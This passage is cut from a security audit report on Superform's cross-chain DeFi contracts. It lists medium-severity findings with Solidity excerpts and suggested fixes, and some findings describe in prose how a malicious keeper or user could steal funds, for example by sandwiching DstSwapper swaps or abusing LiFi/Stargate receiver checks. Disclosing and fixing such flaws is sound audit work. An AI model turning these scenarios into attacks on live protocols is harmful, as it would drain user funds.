Later failed payload will be resolved using `proposeRescueFailedDeposits` function and payload initiator will be refunded. And in case if they will not notice that token has changed, then it's possible that they will refund wrong amount of tokens. This is also a problem in case if attacker will compromise `CORE_STATE_REGISTRY_RESCUER_ROLE` role.
- Impact
Attacker can get bigger amount of funds
- Recommended Mitigation Steps
In case if superform is invalid, then don't update `failedDeposits[payloadId_].settlementToken.push(asset)` to the token returned by invalid vault.



### ERC4626FormImplementation._processDirectWithdraw sends funds to msg.sender instead of receiver

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Proof of Concept
When user wants to do a withdraw on same chain(or on another chain), then he provides `receiverAddress` of the funds inside his request. 

When request is executed in the `ERC4626FormImplementation._processDirectWithdraw` function, then this param is not used, but [`srcSender` is used instead](https://github.com/superform-xyz/superform-core/blob/main/src/forms/ERC4626FormImplementation.sol#L287). As result funds will be withdrawn to wrong address which can make problems, for example for some other vaults that are constructed upon superform vaults and should send funds to another recipient.

Pls, note that for withdraws on another chain, [funds are sent correctly](https://github.com/superform-xyz/superform-core/blob/main/src/forms/ERC4626FormImplementation.sol#L355C53-L355C69).

Why i believe this is high? Suppose that another contract uses superform as vault and holds all superpositions inside. Users receive shares when deposit into it. And in order to withdraw that contract will pass user's address as receiver. But funds will be sent back to the contract and it's really likely that user will get nothing. However for xChain it will work fine, so it's possible that they will not notice that quickly. As result such a contract will not be able to work normally and some user's will lose funds.
- Impact
Funds can be sent to another recipient, which can lead to loss of funds.
- Recommended Mitigation Steps
Send funds to the `receiverAddress` only. Also make sure [to use it here as well](https://github.com/superform-xyz/superform-core/blob/main/src/forms/ERC4626FormImplementation.sol#L317).



### Withdrawal on xChain will revert when srcSender != receiverAddress

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Proof of Concept
When user wants to do a withdraw, then he provides `receiverAddress` of the funds inside his request. It's possible that user will not provide `txData` in the liqRequest and will wait that keepers will do that on destination chain for him.

This can be done using `CoreStateRegistry.updateWithdrawPayload` function and eventually, it will call `CoreStateRegistry._updateTxData` function. So keeper will provide txData using this function and [there will be validation for that txData](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L655-L667) and what should we note is that [`srcSender` is passed to it](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L663). This `srcSender` will be used to check that [same address is used in the txData as funds receiver](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-liquidity/socket/SocketValidator.sol#L64). 

So to make update not fail, keeper should provide source chain initiators as funds receiver in txData. Otherwise, function will revert.

After this is done, then xChain withdrawal can be processed. Inside `ERC4626FormImplementation._processXChainWithdraw` function `txData` provided by keeper is checked again, and now [`singleVaultData_.receiverAddress` is passed as `srcSender`](https://github.com/superform-xyz/superform-core/blob/main/src/forms/ERC4626FormImplementation.sol#L383), which means that in case if source chain sender is not equal to the `singleVaultData_.receiverAddress`, then validation will revert and withdraw will not be executed.
- Impact
Withdraw will revert.
- Recommended Mitigation Steps
Inside `CoreStateRegistry._updateTxData` use `singleVaultData_.receiverAddress` to check if txData is valid.



### Keeper can steal funds from the DstSwapper

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Proof of Concept
When user deposits to another chains, then he can do a dst swap, which means that after bridging from source to destination bridge will sent not vault's asset to the destination chain. So this interim token should be swapped to the vault's asset. This job is done by keepers. They call `DstSwapper.processTx` function and provide swapping `txData`, which contains info about the swap.

All validation and swap is done inside `_processTx` function. Token that should be sent and amount is then [decoded from txData](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-liquidity/DstSwapper.sol#L298) and token is checked [to be same as interim token of user](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-liquidity/DstSwapper.sol#L300-L302). After that `txData` is validated, to check that receiver of swap is set to the CSR. Then [swap is done](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-liquidity/DstSwapper.sol#L327-L333).

And in the end there is a check, [that CSR indeed have increased balance](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-liquidity/DstSwapper.sol#L353-L355) with amount that user has requested.

Keepers currently belong to the protocol, however they have plans to change that and allow other entities to execute that role.

Malicious keeper can create small deposit from one chain to another with dst swap and set interim token to the one that he wants to steal. In this deposit he will provide really high slippage(like > 90). The reason he does that is that he will provide txData that will swap whole balance of interim token in the DstSwapper and he would like to sandwhich this swap call(`DstSwapper.processTx` call) in order to get profit from such a high slippage and big amount of tokens. So he will sandwich this swap on the dex that the bridge will use.

As result, after the swap, some amount of tokens will still come to the CSR and that's why balance and slippage check will pass and tx will not revert. But using this approach keeper is able to steal user's funds from the DstSwapper.

I will set impact to the medium as currently keepers are not decentralized.
- Impact
Keeper can steal funds.
- Recommended Mitigation Steps
The best solution that i see is to have some kind of oracles. So you will be able to calculate approx value of the tokens that depositor expects to receive and then not allow the keeper to use more than same value in other asset + some deviation.



### Vaults write function return values could not reflect the real output

**Severity:** Medium risk

**Context:** [ERC4626FormImplementation.sol#L240-L240](superform-core/src/forms/ERC4626FormImplementation.sol#L240-L240)

**Description**:
When the superform calls either `deposit` or `redeem` methods of the underlying vault, it uses the return value of those functions to fetch the amount of shares minted on `deposit` and the amount of assets withdrawn on `redeem`.  Some vaults could not reflect the reality in their return values(maybe they decided to return an empty value, or returns the shares value when redeeming, instead of the real assets might be less due to slippage of swaps in the withdraw process) and this would make the superform have an incorrect accounting of it's shares and superpositions, potentially accounting users' positions unfairly.

**Recommendation**:
Fetch the real output directly from the shares or assets balance, using `balanceOf` function for extra security. The contract could even require the return value to equal the real output for more sanity.
```solidit
if (singleVaultData_.retain4626) {
            uint256 balanceBefore = v.balanceOf(address(singleVaultData_.receiverAddress));
            v.deposit(vars.assetDifference, singleVaultData_.receiverAddress);
            dstAmount = v.balanceOf(address(singleVaultData_.receiverAddress)) - balanceBefore;
        } else {
//...

```



### Keeper will always overwrite the user `txData` in case of single crosschain withdraw

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- summary :

- the keeper will always ovewrite the `txData` when updating the withdraw payload in case of a single withdraw , while it shouldn't be updated if the user already provided a `txData` like in multi withdraw behavior .

- Details :

- The [`updateWithdrawPayload`](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L115) function within the `CoreStateRegistry` contract plays the role of updating the withdrawal payload with a (`txData_`) provided by the keeper.Particularly in [\_updateWithdrawPayload](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L592) function.

```js
    // updateWithdrawPayload function
    // prev code ...
 >>    prevPayloadBody = _updateWithdrawPayload(prevPayloadBody, srcSender, srcChainId, txData_, isMulti);
    // more code ..
```

- This function is expected to call [\_updateTxData](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L640) to conditionally update the payload with the keeper's `txData_`.

```js
     // _updateWithdrawPayload() function
     // prev code ....
  >>  multiVaultData = _updateTxData(txData_, multiVaultData, srcSender_, srcChainId_, CHAIN_ID);
     // more code ..
```

- The [\_updateTxData](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L640) function should leave the user's `txData` unchanged if it is already provided (i.e., if its length is not zero).

```js
  function _updateTxData(/*....*/) internal view returns (InitMultiVaultData memory){

        uint256 len = multiVaultData_.liqData.length;

        for (uint256 i; i < len; ++i) {
   >>       if (txData_[i].length != 0 && multiVaultData_.liqData[i].txData.length == 0) {
             }
        }

        return multiVaultData_;
    }
```

- in case of singleWithdraw, regardless of whether the user's `txData` was provided or not, the function will always overwrite the user `singleVaultData.liqData.txData` to `txData_[0]` which is the keeper's data. instead of `txData` returned from [\_updateTxData](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L640) function . which will not be the keeper `txData` in case user provided data .

```js
  function _updateWithdrawPayload( bytes memory prevPayloadBody_, address srcSender_, uint64 srcChainId_,
    bytes[] calldata txData_,uint8 multi )internal  view returns (bytes memory){
       // prev code ..
        multiVaultData = _updateTxData(txData_, multiVaultData, srcSender_, srcChainId_, CHAIN_ID);

        if (multi == 0) {
            // @audit-issue : the keeper will always overwrite the txData,should be multiVaultData.liqData.txdata[0]
  >>        singleVaultData.liqData.txData = txData_[0];
            return abi.encode(singleVaultData);
        }

        return abi.encode(multiVaultData);
    }
```

- The correct behavior should ensure that the user's txData is preserved when provided (like in multi withdraw), and the keeper's txData is only utilized if the user's txData is absent.

- impact :

- The impact is somewhat unclear in this scenario because of the unknown keeper Behavior.however, due to the validation process before executing the `txData`, there are some potential issues i can think off In case `TxData` maliciously updated that will pass the validation:

1.  can set the `amountIn` for the swap too low, causing the withdrawn amounts of the user to swap only a small portion, with the remainder staying in the `superForm`.
2.  can alter the final received token after the swap to any token (e.g., swapping from USDC to WETH, the keeper might set it to swap from USDC to anyToken).
3.  can change the behavior of the `txData` (e.g : from swap and bridge, to only swap)

- Recommendation :

```Diff
// prev code ...
if (multi == 0) {
--          singleVaultData.liqData.txData = txData_[0];
++          singleVaultData.liqData.txData = multiVaultData.liqData.txdata[0]
            return abi.encode(singleVaultData);
        }
// more code ....

```



### `directDepositIntoVault` of Superforms should check max slippage provided by user

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

When users want to deposit to superforms directly in the same chain, user can call `singleDirectSingleVaultDeposit` or `singleDirectMultiVaultDeposit`.

https://github.com/superform-xyz/superform-core/blob/main/src/SuperformRouter.sol#L25-L34

```solidity
    /// @inheritdoc IBaseRouter
    function singleDirectSingleVaultDeposit(SingleDirectSingleVaultStateReq memory req_)
        external
        payable
        override(BaseRouter, IBaseRouter)
    {
        uint256 balanceBefore = address(this).balance - msg.value;

        _singleDirectSingleVaultDeposit(req_);
        _forwardPayment(balanceBefore);
    }
```

https://github.com/superform-xyz/superform-core/blob/main/src/SuperformRouter.sol#L49-L58

```solidity
    function singleDirectMultiVaultDeposit(SingleDirectMultiVaultStateReq memory req_)
        external
        payable
        override(BaseRouter, IBaseRouter)
    {
        uint256 balanceBefore = address(this).balance - msg.value;

        _singleDirectMultiVaultDeposit(req_);
        _forwardPayment(balanceBefore);
    }
```

In these functions, user can provide max slippage as parameters and will be passed to superform when trigger `directDepositIntoVault`.

```solidity
     struct SingleDirectSingleVaultStateReq {
         SingleVaultSFData superformData;
     }

     struct SingleVaultSFData {
         // superformids must have same destination. Can have different underlyings
         uint256 superformId;
         uint256 amount;
         uint256 maxSlippage;
         LiqRequest liqRequest; // if length = 1; amount = sum(amounts)| else  amounts must match the amounts being sent
         bytes permit2data;
         bool hasDstSwap; 
         bool retain4626; // if true, we don't mint SuperPositions, and send the 4626 back to the user instead
         address receiverAddress;
         bytes extraFormData; // extraFormData
     }

      struct SingleDirectMultiVaultStateReq {
          MultiVaultSFData superformData;
      }

      struct MultiVaultSFData {
          // superformids must have same destination. Can have different underlyings
          uint256[] superformIds;
          uint256[] amounts;
          uint256[] maxSlippages;
          LiqRequest[] liqRequests; // if length = 1; amount = sum(amounts) | else  amounts must match the amounts being sent
          bytes permit2data;
          bool[] hasDstSwaps;
          bool[] retain4626s; // if true, we don't mint SuperPositions, and send the 4626 back to the user instead
          address receiverAddress;
          bytes extraFormData; // extraFormData
      }
```

https://github.com/superform-xyz/superform-core/blob/main/src/BaseRouterImplementation.sol#L556-L589

```solidity
    /// @notice fulfils the final stage of same chain deposit action
    function _directDeposit(
        address superform_,
        uint256 payloadId_,
        uint256 superformId_,
        uint256 amount_,
        uint256 maxSlippage_,
        bool retain4626_,
        LiqRequest memory liqData_,
        address receiverAddress_,
        bytes memory extraFormData_,
        uint256 msgValue_,
        address srcSender_
    )
        internal
        virtual
        returns (uint256 dstAmount)
    {
        /// @dev deposits token to a given vault and mint vault positions directly through the form
        dstAmount = IBaseForm(superform_).directDepositIntoVault{ value: msgValue_ }(
            InitSingleVaultData(
                payloadId_,
                superformId_,
                amount_,
                maxSlippage_, // @audit - maxSlippage is provided and passed to superform
                liqData_,
                false,
                retain4626_,
                receiverAddress_,
                /// needed if user if keeping 4626
                extraFormData_
            ),
            srcSender_
        );
    }
```

However, when `directDepositIntoVault` is called, the `maxSlippage` is never checked when processing the token amount. Instead, it strictly check `vars.assetDifference` must not lower than `singleVaultData_.amount`

https://github.com/superform-xyz/superform-core/blob/main/src/forms/ERC4626FormImplementation.sol#L231-L233

```solidity
    function _processDirectDeposit(InitSingleVaultData memory singleVaultData_) internal returns (uint256 dstAmount) {
        directDepositLocalVars memory vars;

        IERC4626 v = IERC4626(vault);
        vars.asset = address(asset);
        vars.balanceBefore = IERC20(vars.asset).balanceOf(address(this));
        IERC20 token = IERC20(singleVaultData_.liqData.token);

        if (address(token) != NATIVE && singleVaultData_.liqData.txData.length == 0) {
            /// @dev this is only valid if token == asset (no txData)
            if (singleVaultData_.liqData.token != vars.asset) revert Error.DIFFERENT_TOKENS();

            /// @dev handles the asset token transfers.
            if (token.allowance(msg.sender, address(this)) < singleVaultData_.amount) {
                revert Error.DIRECT_DEPOSIT_INSUFFICIENT_ALLOWANCE();
            }

            /// @dev transfers input token, which is the same as vault asset, to the form
            token.safeTransferFrom(msg.sender, address(this), singleVaultData_.amount);
        }

        /// @dev non empty txData means there is a swap needed before depositing (input asset not the same as vault
        /// asset)
        if (singleVaultData_.liqData.txData.length != 0) {
            vars.bridgeValidator = superRegistry.getBridgeValidator(singleVaultData_.liqData.bridgeId);

            vars.chainId = CHAIN_ID;

            vars.inputAmount =
                IBridgeValidator(vars.bridgeValidator).decodeAmountIn(singleVaultData_.liqData.txData, false);

            if (address(token) != NATIVE) {
                /// @dev checks the allowance before transfer from router
                if (token.allowance(msg.sender, address(this)) < vars.inputAmount) {
                    revert Error.DIRECT_DEPOSIT_INSUFFICIENT_ALLOWANCE();
                }

                /// @dev transfers input token, which is different from the vault asset, to the form
                token.safeTransferFrom(msg.sender, address(this), vars.inputAmount);
            }

            IBridgeValidator(vars.bridgeValidator).validateTxData(
                IBridgeValidator.ValidateTxDataArgs(
                    singleVaultData_.liqData.txData,
                    vars.chainId,
                    vars.chainId,
                    vars.chainId,
                    true,
                    address(this),
                    msg.sender,
                    address(token),
                    address(0)
                )
            );

            _dispatchTokens(
                superRegistry.getBridgeAddress(singleVaultData_.liqData.bridgeId),
                singleVaultData_.liqData.txData,
                address(token),
                vars.inputAmount,
                singleVaultData_.liqData.nativeAmount
            );

            if (
                IBridgeValidator(vars.bridgeValidator).decodeSwapOutputToken(singleVaultData_.liqData.txData)
                    != vars.asset
            ) {
                revert Error.DIFFERENT_TOKENS();
            }
        }

        vars.assetDifference = IERC20(vars.asset).balanceOf(address(this)) - vars.balanceBefore;

        /// @dev the difference in vault tokens, ready to be deposited, is compared with the amount inscribed in the
        /// superform data
>>>     if (vars.assetDifference < singleVaultData_.amount) {
            revert Error.DIRECT_DEPOSIT_INVALID_DATA();
        }

        /// @dev notice that vars.assetDifference is deposited regardless if txData exists or not
        /// @dev this presumes no dust is left in the superform
        IERC20(vars.asset).safeIncreaseAllowance(vault, vars.assetDifference);

        if (singleVaultData_.retain4626) {
            dstAmount = v.deposit(vars.assetDifference, singleVaultData_.receiverAddress);
        } else {
            dstAmount = v.deposit(vars.assetDifference, address(this));
        }
    }
```
This could lead to an issue, especially if the users use an allowed swap provider, most likely asset will not be exactly the same and slightly less than the provided `singleVaultData_.amount`. The calls could result in a revert most of the time.

**Recommendation**:

User the user's provided `maxSlippage` and check `vars.assetDifference` must not lower than the allowed slippage instead.

```diff
    function _processDirectDeposit(InitSingleVaultData memory singleVaultData_) internal returns (uint256 dstAmount) {
        directDepositLocalVars memory vars;

        IERC4626 v = IERC4626(vault);
        vars.asset = address(asset);
        vars.balanceBefore = IERC20(vars.asset).balanceOf(address(this));
        IERC20 token = IERC20(singleVaultData_.liqData.token);

        if (address(token) != NATIVE && singleVaultData_.liqData.txData.length == 0) {
            /// @dev this is only valid if token == asset (no txData)
            if (singleVaultData_.liqData.token != vars.asset) revert Error.DIFFERENT_TOKENS();

            /// @dev handles the asset token transfers.
            if (token.allowance(msg.sender, address(this)) < singleVaultData_.amount) {
                revert Error.DIRECT_DEPOSIT_INSUFFICIENT_ALLOWANCE();
            }

            /// @dev transfers input token, which is the same as vault asset, to the form
            token.safeTransferFrom(msg.sender, address(this), singleVaultData_.amount);
        }

        /// @dev non empty txData means there is a swap needed before depositing (input asset not the same as vault
        /// asset)
        if (singleVaultData_.liqData.txData.length != 0) {
            vars.bridgeValidator = superRegistry.getBridgeValidator(singleVaultData_.liqData.bridgeId);

            vars.chainId = CHAIN_ID;

            vars.inputAmount =
                IBridgeValidator(vars.bridgeValidator).decodeAmountIn(singleVaultData_.liqData.txData, false);

            if (address(token) != NATIVE) {
                /// @dev checks the allowance before transfer from router
                if (token.allowance(msg.sender, address(this)) < vars.inputAmount) {
                    revert Error.DIRECT_DEPOSIT_INSUFFICIENT_ALLOWANCE();
                }

                /// @dev transfers input token, which is different from the vault asset, to the form
                token.safeTransferFrom(msg.sender, address(this), vars.inputAmount);
            }

            IBridgeValidator(vars.bridgeValidator).validateTxData(
                IBridgeValidator.ValidateTxDataArgs(
                    singleVaultData_.liqData.txData,
                    vars.chainId,
                    vars.chainId,
                    vars.chainId,
                    true,
                    address(this),
                    msg.sender,
                    address(token),
                    address(0)
                )
            );

            _dispatchTokens(
                superRegistry.getBridgeAddress(singleVaultData_.liqData.bridgeId),
                singleVaultData_.liqData.txData,
                address(token),
                vars.inputAmount,
                singleVaultData_.liqData.nativeAmount
            );

            if (
                IBridgeValidator(vars.bridgeValidator).decodeSwapOutputToken(singleVaultData_.liqData.txData)
                    != vars.asset
            ) {
                revert Error.DIFFERENT_TOKENS();
            }
        }

        vars.assetDifference = IERC20(vars.asset).balanceOf(address(this)) - vars.balanceBefore;

        /// @dev the difference in vault tokens, ready to be deposited, is compared with the amount inscribed in the
        /// superform data
-        if (vars.assetDifference < singleVaultData_.amount) {
-            revert Error.DIRECT_DEPOSIT_INVALID_DATA();
-        }
+        if (vars.assetDifference < ((singleVaultData_.amount * (10_000 - singleVaultData_.maxSlippage)) / 10_000)) {
+           revert Error.DIRECT_DEPOSIT_INVALID_DATA();
+        }

        /// @dev notice that vars.assetDifference is deposited regardless if txData exists or not
        /// @dev this presumes no dust is left in the superform
        IERC20(vars.asset).safeIncreaseAllowance(vault, vars.assetDifference);

        if (singleVaultData_.retain4626) {
            dstAmount = v.deposit(vars.assetDifference, singleVaultData_.receiverAddress);
        } else {
            dstAmount = v.deposit(vars.assetDifference, address(this));
        }
    }
```



### direct deposit via router should mint super positions to user's provided receiver address instead of `msg.sender`

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

When `singleDirectSingleVaultDeposit` or `singleDirectMultiVaultDeposit` is called and `retain4626s` is set to false. The function will mint super positions to the `rcSender_` instead of `vaultData_.receiverAddress`.

https://github.com/superform-xyz/superform-core/blob/main/src/SuperformRouter.sol#L25-L34

```solidity
    function singleDirectSingleVaultDeposit(SingleDirectSingleVaultStateReq memory req_)
        external
        payable
        override(BaseRouter, IBaseRouter)
    {
        uint256 balanceBefore = address(this).balance - msg.value;

        _singleDirectSingleVaultDeposit(req_);
        _forwardPayment(balanceBefore);
    }
```

https://github.com/superform-xyz/superform-core/blob/main/src/SuperformRouter.sol#L49-L58

```solidity
    function singleDirectMultiVaultDeposit(SingleDirectMultiVaultStateReq memory req_)
        external
        payable
        override(BaseRouter, IBaseRouter)
    {
        uint256 balanceBefore = address(this).balance - msg.value;

        _singleDirectMultiVaultDeposit(req_);
        _forwardPayment(balanceBefore);
    }
```

https://github.com/superform-xyz/superform-core/blob/main/src/BaseRouterImplementation.sol#L593-L630

```solidity
    function _directSingleDeposit(
        address srcSender_,
        bytes memory permit2data_,
        InitSingleVaultData memory vaultData_
    )
        internal
        virtual
    {
        address superform;
        uint256 dstAmount;

        /// @dev decode superforms
        (superform,,) = vaultData_.superformId.getSuperform();

        _singleVaultTokenForward(srcSender_, superform, permit2data_, vaultData_);

        /// @dev deposits token to a given vault and mint vault positions.
        dstAmount = _directDeposit(
            superform,
            vaultData_.payloadId,
            vaultData_.superformId,
            vaultData_.amount,
            vaultData_.maxSlippage,
            vaultData_.retain4626,
            vaultData_.liqData,
            vaultData_.receiverAddress,
            vaultData_.extraFormData,
            vaultData_.liqData.nativeAmount,
            srcSender_
        );

        if (dstAmount != 0 && !vaultData_.retain4626) {
            /// @dev mint super positions at the end of the deposit action if user doesn't retain 4626
>>>         ISuperPositions(superRegistry.getAddress(keccak256("SUPER_POSITIONS"))).mintSingle(
                srcSender_, vaultData_.superformId, dstAmount
            );
        }
    }
```

https://github.com/superform-xyz/superform-core/blob/main/src/BaseRouterImplementation.sol#L634-L679

```solidity
    function _directMultiDeposit(
        address srcSender_,
        bytes memory permit2data_,
        InitMultiVaultData memory vaultData_
    )
        internal
        virtual
    {
        MultiDepositLocalVars memory v;
        v.len = vaultData_.superformIds.length;

        v.superforms = new address[](v.len);
        v.dstAmounts = new uint256[](v.len);

        /// @dev decode superforms
        v.superforms = DataLib.getSuperforms(vaultData_.superformIds);

        _multiVaultTokenForward(srcSender_, v.superforms, permit2data_, vaultData_, false);

        for (uint256 i; i < v.len; ++i) {
            /// @dev deposits token to a given vault and mint vault positions.
            v.dstAmounts[i] = _directDeposit(
                v.superforms[i],
                vaultData_.payloadId,
                vaultData_.superformIds[i],
                vaultData_.amounts[i],
                vaultData_.maxSlippages[i],
                vaultData_.retain4626s[i],
                vaultData_.liqData[i],
                vaultData_.receiverAddress,
                vaultData_.extraFormData,
                vaultData_.liqData[i].nativeAmount,
                srcSender_
            );

            /// @dev if retain4626 is set to True, set the amount of SuperPositions to mint to 0
            if (v.dstAmounts[i] != 0 && vaultData_.retain4626s[i]) {
                v.dstAmounts[i] = 0;
            }
        }

        /// @dev in direct deposits, SuperPositions are minted right after depositing to vaults
        ISuperPositions(superRegistry.getAddress(keccak256("SUPER_POSITIONS"))).mintBatch(
>>>         srcSender_, vaultData_.superformIds, v.dstAmounts
        );
    }
```

This is inconsistent and and could break users assumption, the `mintBatch` and `mintSingle` should mint to  `vaultData_.receiverAddress` instead of ` srcSender_` .


**Recommendation**:

Update the `mintBatch` and `mintSingle` to mint super positions to `vaultData_.receiverAddress` .



### Quorum assumed to be the same for all chains, could cause messages cannot be processed

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

When cross chain deposit/withdraw is requested via router, it will eventually trigger dispatch payload via core state registry and send the message trough user's provided ambs.

https://github.com/superform-xyz/superform-core/blob/main/src/BaseRouterImplementation.sol#L546-L548

```solidity
    function _dispatchAmbMessage(DispatchAMBMessageVars memory vars_) internal virtual {
        AMBMessage memory ambMessage = AMBMessage(
            DataLib.packTxInfo(
                uint8(vars_.txType),
                uint8(CallbackType.INIT),
                vars_.multiVaults,
                STATE_REGISTRY_TYPE,
                vars_.srcSender,
                vars_.srcChainId
            ),
            vars_.ambData
        );

        (uint256 fees, bytes memory extraData) = IPaymentHelper(superRegistry.getAddress(keccak256("PAYMENT_HELPER")))
            .calculateAMBData(vars_.dstChainId, vars_.ambIds, abi.encode(ambMessage));

        ISuperPositions(superRegistry.getAddress(keccak256("SUPER_POSITIONS"))).updateTxHistory(
            vars_.currentPayloadId, ambMessage.txInfo
        );

        /// @dev this call dispatches the message to the AMB bridge through dispatchPayload
>>>     IBaseStateRegistry(superRegistry.getAddress(keccak256("CORE_STATE_REGISTRY"))).dispatchPayload{ value: fees }(
            vars_.srcSender, vars_.ambIds, vars_.dstChainId, abi.encode(ambMessage), extraData
        );
    }
```

And before dispatching messages using the provided ambs, it first check if the amb count is passed the destination chain quorum value.

https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/BaseStateRegistry.sol#L155-L157

```solidity
    function _dispatchPayload(
        address srcSender_,
        uint8[] memory ambIds_,
        uint64 dstChainId_,
        bytes memory message_,
        bytes memory extraData_
    )
        internal
    {
        AMBMessage memory data = abi.decode(message_, (AMBMessage));
        uint256 len = ambIds_.length;

        if (len == 0) {
            revert Error.ZERO_AMB_ID_LENGTH();
        }

        /// @dev revert here if quorum requirements might fail on the remote chain
>>>     if (len - 1 < _getQuorum(dstChainId_)) {
            revert Error.INSUFFICIENT_QUORUM();
        }

        AMBExtraData memory d = abi.decode(extraData_, (AMBExtraData));

        _getAMBImpl(ambIds_[0]).dispatchPayload{ value: d.gasPerAMB[0] }(
            srcSender_,
            dstChainId_,
            abi.encode(AMBMessage(data.txInfo, abi.encode(ambIds_, data.params))),
            d.extraDataPerAMB[0]
        );

        if (len > 1) {
            data.params = message_.computeProofBytes();

            /// @dev i starts from 1 since 0 is primary amb id which dispatches the message itself
            for (uint8 i = 1; i < len; ++i) {
                if (ambIds_[i] == ambIds_[0]) {
                    revert Error.INVALID_PROOF_BRIDGE_ID();
                }

                if (i - 1 != 0 && ambIds_[i] <= ambIds_[i - 1]) {
                    revert Error.DUPLICATE_PROOF_BRIDGE_ID();
                }

                /// @dev proof is dispatched in the form of a payload
                _getAMBImpl(ambIds_[i]).dispatchPayload{ value: d.gasPerAMB[i] }(
                    srcSender_, dstChainId_, abi.encode(data), d.extraDataPerAMB[i]
                );
            }
        }
    }
```

Now, when message is received and need to be updated/processed, it will also check the quorum, but it uses source chain quorum.

https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L380-L381

```solidity
    function _getPayload(uint256 payloadId_)
        internal
        view
        returns (
            uint256 payloadHeader_,
            bytes memory payloadBody_,
            bytes32 payloadProof,
            uint8 txType,
            uint8 callbackType,
            uint8 isMulti,
            uint8 registryId,
            address srcSender,
            uint64 srcChainId
        )
    {
        payloadHeader_ = payloadHeader[payloadId_];
        payloadBody_ = payloadBody[payloadId_];
        payloadProof = AMBMessage(payloadHeader_, payloadBody_).computeProof();
        (txType, callbackType, isMulti, registryId, srcSender, srcChainId) = payloadHeader_.decodeTxInfo();

        /// @dev the number of valid proofs (quorum) must be equal or larger to the required messaging quorum
>>>     if (messageQuorum[payloadProof] < _getQuorum(srcChainId)) {
            revert Error.INSUFFICIENT_QUORUM();
        }
    }
```

This assumes source chain and destination chain have the same quorum, which is not always true, it is possible that amb is available in the src chain but not the dst chain or the other way around, making it possible for the quorum between chains is different. If this happened, the message quorum cannot be reached and message will stuck.


**Recommendation**:

Check which quorum is smaller between src chain and dst chain, and use the smaller value instead.



### LiFiValidator::validateTx Incorrect receiver check for LiFi over Stargate/Celer/Amarok bridging

**Severity:** Medium risk

**Context:** [LiFiValidator.sol#L48-L48](superform-core/src/crosschain-liquidity/lifi/LiFiValidator.sol#L48-L48)

- Summary
LiFi is a liquidity bridge which acts as a wrapper on top of many bridges. Among them is Stargate which itself is built upon the messaging mechanism of Layerzero. When calling LiFi over Stargate for dispatching tokens, Superform does not check the receiver address correctly, which means that a malicious user could send tokens to himself and depending on off-chains mechanisms of Superform, can attempt to use the liquidity bridged by another user for himself.

In this report we will detail the process for Stargate based bridging, but the process is similar to Celer/Amarok based bridging. 

- Vulnerability Detail
let's examine the `LiFiValidator::validateTxData` function:

```solidity
function validateTxData(ValidateTxDataArgs calldata args_) external view override returns (bool hasDstSwap) {
        /// @dev xchain actions can have bridgeData or bridgeData + swapData
        /// @dev direct actions with deposit, cannot have bridge data - goes into catch block
        /// @dev withdraw actions may have bridge data after withdrawing - goes into try block
        /// @dev withdraw actions without bridge data (just swap) - goes into catch block

        try this.extractMainParameters(args_.txData) returns (
            string memory, /*bridge*/
            address sendingAssetId,
>>>         address receiver,
            uint256, /*amount*/
            uint256, /*minAmount*/
            uint256 destinationChainId,
            bool, /*hasSourceSwaps*/
            bool hasDestinationCall
        ) {
            ...
        } catch {
            ...
        }
}
```

We see that the receiver extracted is the one from the struct `ILiFi.BridgeData`, and checks are carried out solely on that value. However during the call to `StargateFacet`, the value of `_stargateData.callTo` is used as the receiver of funds on target chain.

```solidity
function _startBridge(
    ILiFi.BridgeData memory _bridgeData,
    StargateData calldata _stargateData
) private {
    if (LibAsset.isNativeAsset(_bridgeData.sendingAssetId)) {
        //Native token handling
        ...
    } else {
        LibAsset.maxApproveERC20(
            IERC20(_bridgeData.sendingAssetId),
            address(composer),
            _bridgeData.minAmount
        );

        composer.swap{ value: _stargateData.lzFee }(
            getLayerZeroChainId(_bridgeData.destinationChainId),
            _stargateData.srcPoolId,
            _stargateData.dstPoolId,
            _stargateData.refundAddress,
            _bridgeData.minAmount,
            _stargateData.minAmountLD,
            IStargateRouter.lzTxObj(
                _stargateData.dstGasForCall,
                0,
                toBytes(address(0))
            ),
>>>         _stargateData.callTo,
            _stargateData.callData
        );
    }

    emit PartnerSwap(0x0006);

    emit LiFiTransferStarted(_bridgeData);
}
```

There is a security check during the call which checks that `callData` is empty when `!_bridgeData.hasDestinationCall` (enforced during `validateTxData`):

https://github.com/lifinance/contracts/blob/44bae5072fac2594f38c767b7e36a6b12fbd5c27/src/Facets/StargateFacet.sol#L119

https://github.com/lifinance/contracts/blob/44bae5072fac2594f38c767b7e36a6b12fbd5c27/src/Facets/StargateFacet.sol#L229-L239

But it is still possible to use this call with empty data, and tokens are still transferred to _stargateData.callTo on destination chain.

- Impact
A user can attempt to steal the liquidity on destination chain provided by another user (if the keeper sees the bridging action as completed and uses liquidity already available in `DstSwapper`), or other liquidity already present in `DstSwapper`. The exact impact depends on checks carried out by the offchain logic of keepers.

Here we have shown a concrete example in the case of Stargate based routing, but the same process also applies to Amarok/CelerIM bridging.

- Code Snippet

- Tool used
Manual Review

- Recommendation
Take a look at the additional checks carried out in `CalldataVerificationFacet.sol`:

